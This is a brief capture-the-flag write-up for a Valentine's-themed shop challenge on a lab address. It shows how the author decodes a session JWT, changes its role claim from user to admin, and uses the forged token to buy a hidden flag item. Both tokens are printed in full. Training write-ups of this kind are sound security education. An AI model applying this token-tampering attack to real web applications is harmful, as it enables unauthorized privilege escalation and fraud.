## Description
_Flags have been omitted from this writeup per platform guidelines._

```Description
Access the hidden item in this Valentine's gift shop.
My Dearest Hacker,

The TryHeartMe shop is open for business. Can you find a way to purchase the hidden “Valenflag” item?   
You can access the web app here: `http://10.49.135.40:5000`
```
## IP-Address
```IP-Address
http://10.49.135.40:5000
```
## Web
- Sign up & login
```jwt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRobUB0aG0iLCJyb2xlIjoidXNlciIsImNyZWRpdHMiOjAsImlhdCI6MTc3MTIwNDI4OSwidGhlbWUiOiJ2YWxlbnRpbmUifQ.xcWsexpUKoEcP-SVvTEaCPouyawTSezNMq11VfqCVI0
```
decoder 
```json
{
  "email": "thm@thm",
  "role": "user",
  "credits": 0,
  "iat": 1771204289,
  "theme": "valentine"
}
```
Editor
```jwt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRobUB0aG0iLCJyb2xlIjoiYWRtaW4iLCJjcmVkaXRzIjowLCJpYXQiOjE3NzEyMDQyODksInRoZW1lIjoidmFsZW50aW5lIn0.KD08jdisamUsC9gSsd4op2FIDp9F8rCleUbiBccL9uI
```
- decoder
```json
{
  "email": "thm@thm",
  "role": "admin",
  "credits": 0,
  "iat": 1771204289,
  "theme": "valentine"
}
```
- now Edit on web and reload 
- Got the admin access and buy the flag with 777 credit and we have 5000 credits
```Flag
[flag omitted] 
```
# END
